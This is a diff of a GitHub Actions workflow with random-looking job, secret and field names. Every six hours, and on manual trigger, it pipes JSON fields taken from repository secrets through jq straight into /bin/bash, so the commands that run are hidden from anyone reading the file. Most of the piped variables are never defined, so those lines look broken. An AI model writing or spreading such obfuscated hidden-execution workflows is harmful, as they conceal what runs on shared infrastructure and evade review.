@@ -1,23 +1,24 @@
 name: qushubin2418
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
-
+    - cron: '35 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qushubin2418
         env:
-          pqbt02778: ${{ secrets.pqbt02778 }}
+          t0993: ${{ secrets.t0993 }}
         run: |
-          echo $pqbt02778 | jq -r .pa11938 | /bin/bash
-          echo $qc85763 | jq -r .z85866 | /bin/bash
-          echo $ekw82 | jq -r .py4239 | /bin/bash
-          echo $aief216 | jq -r .z57437 | /bin/bash
-          echo $gwht6087 | jq -r .crhyu23609 | /bin/bash
-          echo $vbgri48 | jq -r .lsgvz81320 | /bin/bash
+          echo $t0993 | jq -r .kxm06562 | /bin/bash
+          echo $lzffs31 | jq -r .ub0 | /bin/bash
+          echo $w33 | jq -r .f56 | /bin/bash
+          echo $u73 | jq -r .iudro39575 | /bin/bash
+          echo $aff9576 | jq -r .b90001 | /bin/bash
+          echo $lmin398 | jq -r .djsi34694 | /bin/bash
+          echo $zemf493 | jq -r .hx9 | /bin/bash
+          echo $pa73 | jq -r .xeuy6954 | /bin/bash
 
